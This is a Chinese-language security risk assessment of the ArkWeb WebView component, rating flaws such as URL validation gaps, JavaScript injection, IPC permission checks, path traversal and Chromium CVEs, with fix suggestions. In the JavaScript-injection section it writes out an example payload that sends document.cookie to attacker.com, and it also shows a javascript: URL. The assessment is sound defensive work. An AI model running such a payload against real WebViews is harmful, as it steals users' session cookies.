# ArkWeb WebView 安全风险评估

## 风险评级标准

| 等级 | CVSS 分数 | 定义 | 处理优先级 |
|------|----------|------|-----------|
| 🔴 **严重** | 9.0-10.0 | 可导致系统完全失控 | 立即修复 |
| 🟠 **高危** | 7.0-8.9 | 可导致权限提升或数据泄露 | 24小时内修复 |
| 🟡 **中危** | 4.0-6.9 | 有限的安全影响 | 一周内修复 |
| 🟢 **低危** | 0.1-3.9 | 轻微安全问题 | 下一版本修复 |

---

## R1: 输入验证缺陷

### R1.1 URL 解析与校验不充分

**风险等级**: 🟠 高危

**位置**:
- `interfaces/kits/napi/webviewcontroller/napi_webview_controller.cpp:LoadUrl()`

**证据**:
```cpp
// 参数解析流程
std::string url;
NapiParseUtils::ParseString(env, argv[0], url);
// 直接传递到核心引擎
webviewController->LoadUrl(url, httpHeaders);
```

**攻击路径**:
```
恶意应用 → 构造恶意 URL (javascript:alert(1))
         → 调用 loadUrl()
         → WebView 执行 JavaScript
         → 可能的 XSS 攻击
```

**影响评估**:
- 可利用性: 高 (应用层可直接调用)
- 权限提升: 中 (在 WebView 上下文中执行)
- 影响范围: 仅当前 WebView 实例

**修复建议**:
```cpp
// 建议增加 URL 校验
bool ValidateUrl(const std::string& url) {
    // 1. 检查协议白名单
    if (!IsAllowedScheme(url)) {
        return false;
    }
    // 2. 检查危险字符
    if (ContainsDangerousChars(url)) {
        return false;
    }
    // 3. 规范化 URL
    std::string normalized = NormalizeUrl(url);
    return true;
}
```

### R1.2 JavaScript 代码注入

**风险等级**: 🟠 高危

**位置**:
- `interfaces/kits/napi/webviewcontroller/napi_webview_controller.cpp:RunJavaScript()`

**证据**:
```cpp
static napi_value RunJavaScript(napi_env env, napi_callback_info info) {
    std::string script;
    NapiParseUtils::ParseString(env, argv[0], script);
    // script 直接传递到 V8 引擎执行
    ErrCode errCode = webviewController->RunJavaScript(script, callback);
}
```

**攻击路径**:
```
恶意输入 → RunJavaScript("fetch('http://attacker.com?data=' + document.cookie)")
         → JS 执行 → 数据外泄
```

**修复建议**:
- 应用层应对传入的 JS 代码进行审查
- 建议提供沙箱化的 JS 执行环境

---

## R2: 权限与鉴权

### R2.1 IPC 权限校验绕过

**风险等级**: 🟡 中危

**位置**:
- `sa/web_native_messaging/service/web_native_messaging_service.cpp`

**证据**:
```cpp
ErrCode WebNativeMessagingService::ConnectWebNativeMessagingExtension(...) {
    // 获取调用者 Token
    AccessTokenID callerTokenId = IPCSkeleton::GetCallingTokenID();
    // 使用 Token 进行后续校验
    // ...
}
```

**潜在问题**:
- 缺乏对 Want 参数的完整校验
- BundleName 可能被伪造

**修复建议**:
```cpp
// 增加 Want 参数校验
if (!ValidateWantBundleName(want)) {
    return ERR_WANT_FORMAT_ERROR;
}
// 增加调用者权限校验
if (!VerifyCallerPermission(callerTokenId, PERMISSION_WEB_NATIVE_MESSAGING)) {
    return ERR_PERMISSION_CHECK_ERROR;
}
```

### R2.2 AppFwkUpdateService UID 校验单一

**风险等级**: 🟡 中危

**位置**:
- `sa/app_fwk_update/src/app_fwk_update_service.cpp:VerifyPackageInstall()`

**证据**:
```cpp
ErrCode AppFwkUpdateService::VerifyPackageInstall(...) {
    if (IPCSkeleton::GetCallingUid() != FOUNDATION_UID) {
        return ERR_INVALID_VALUE;
    }
    // ...
}
```

**潜在问题**:
- 仅依赖 UID 校验，缺乏额外的 AccessToken 校验
- UID 可能被伪造（需 root）

---

## R3: 内存安全

### R3.1 字符串拷贝潜在溢出

**风险等级**: 🟢 低危

**位置**:
- 多处 NAPI 参数解析代码

**证据**:
```cpp
// 潜在问题: 未检查字符串长度
std::string url;
napi_get_value_string_utf8(env, value, buffer, sizeof(buffer), &length);
url = buffer;  // 如果 buffer 未正确终止，可能有问题
```

**修复建议**:
- 使用带长度限制的字符串操作
- 增加最大长度校验

---

## R4: 并发安全

### R4.1 适配器多线程访问

**风险等级**: 🟡 中危

**位置**:
- `ohos_adapter/` 各适配器实现

**证据**:
部分适配器缺乏显式的线程安全保护。

**潜在问题**:
- 多 WebView 实例同时访问同一适配器
- 回调函数在线程间传递

**修复建议**:
```cpp
// 使用互斥锁保护共享状态
class AdapterImpl {
private:
    std::mutex mutex_;
    SharedState state_;
    
public:
    void UpdateState(const Data& data) {
        std::lock_guard<std::mutex> lock(mutex_);
        state_ = data;
    }
};
```

---

## R5: 逻辑漏洞

### R5.1 资源耗尽风险

**风险等级**: 🟡 中危

**位置**:
- `ohos_nweb/src/nweb_helper.cpp:CreateNWeb()`

**证据**:
```cpp
// 渲染进程数配置
<renderConfig>
    <renderProcessCount>20</renderProcessCount>
</renderConfig>
```

**潜在问题**:
- 应用可以创建大量 WebView 实例
- 可能导致内存耗尽

**修复建议**:
- 增加每个应用的 WebView 实例上限
- 监控和限制总内存使用

### R5.2 下载功能路径遍历

**风险等级**: 🟠 高危

**位置**:
- `interfaces/kits/napi/webviewcontroller/web_download_manager.cpp`

**潜在问题**:
- 下载文件名可能包含 `../` 等特殊字符
- 可能导致文件写入到预期之外的目录

**修复建议**:
```cpp
// 文件名安全校验
bool IsSafeFileName(const std::string& filename) {
    // 1. 检查路径分隔符
    if (filename.find("..") != std::string::npos) {
        return false;
    }
    // 2. 检查空字符
    if (filename.find('\0') != std::string::npos) {
        return false;
    }
    // 3. 规范化路径
    std::string normalized = NormalizePath(filename);
    return IsWithinDownloadDir(normalized);
}
```

---

## R6: 信息泄露

### R6.1 错误信息泄露内部实现

**风险等级**: 🟢 低危

**位置**:
- 各处错误处理代码

**证据**:
```cpp
// 某些错误返回详细信息
napi_throw_error(env, nullptr, "Failed to load native library: /system/lib/libarkweb_engine.so");
```

**影响**:
- 可能泄露系统路径信息

**修复建议**:
- 对外部只返回通用错误码
- 详细信息记录到日志（需权限查看）

---

## R7: 第三方组件漏洞

### R7.1 Chromium 引擎漏洞

**风险等级**: 🔴 严重

**说明**:
ArkWebCore.hap 基于 Chromium，可能存在未修复的 CVE。

**近期相关 CVE**:
| CVE ID | 组件 | 类型 | CVSS |
|--------|------|------|------|
| CVE-2025-23414 | ArkWeb | Use-After-Free | 7.8 |
| CVE-2025-54607 | ArkWeb | 认证管理漏洞 | 7.7 |

**缓解措施**:
- 及时更新 Chromium 版本
- 启用沙箱隔离
- 监控 CVE 公告

---

## 风险汇总表

| 风险 ID | 类型 | 等级 | 位置 | 状态 |
|---------|------|------|------|------|
| R1.1 | URL 验证 | 🟠 高危 | napi_webview_controller.cpp | 需修复 |
| R1.2 | JS 注入 | 🟠 高危 | napi_webview_controller.cpp | 需修复 |
| R2.1 | IPC 权限 | 🟡 中危 | web_native_messaging_service.cpp | 建议修复 |
| R2.2 | UID 校验 | 🟡 中危 | app_fwk_update_service.cpp | 建议修复 |
| R3.1 | 内存安全 | 🟢 低危 | 多处 | 建议修复 |
| R4.1 | 并发安全 | 🟡 中危 | ohos_adapter/ | 建议修复 |
| R5.1 | 资源耗尽 | 🟡 中危 | nweb_helper.cpp | 建议修复 |
| R5.2 | 路径遍历 | 🟠 高危 | web_download_manager.cpp | 需修复 |
| R6.1 | 信息泄露 | 🟢 低危 | 多处 | 可选修复 |
| R7.1 | 第三方漏洞 | 🔴 严重 | ArkWebCore.hap | 持续监控 |

---

## 安全测试建议

### 静态分析

```bash
# 1. 检查危险函数使用
grep -r "strcpy\|strcat\|sprintf" --include="*.cpp" ohos_nweb/ interfaces/

# 2. 检查 URL 处理
grep -r "loadUrl\|LoadUrl" --include="*.cpp" interfaces/kits/napi/

# 3. 检查权限校验
grep -r "GetCallingUid\|GetCallingTokenID\|VerifyAccessToken" --include="*.cpp" sa/ ohos_adapter/
```

### 动态测试

1. **Fuzzing 测试**
   - 使用已有 Fuzz 测试: `test/fuzztest/`
   - 重点关注: URL, JavaScript, IPC 消息

2. **渗透测试**
   - 构造恶意 URL 测试
   - 测试 JS Bridge 边界
   - 测试 IPC 权限绕过

3. **资源耗尽测试**
   - 创建大量 WebView 实例
   - 大量下载请求

---

*文档版本: 1.0*  
*更新日期: 2026-02-07*
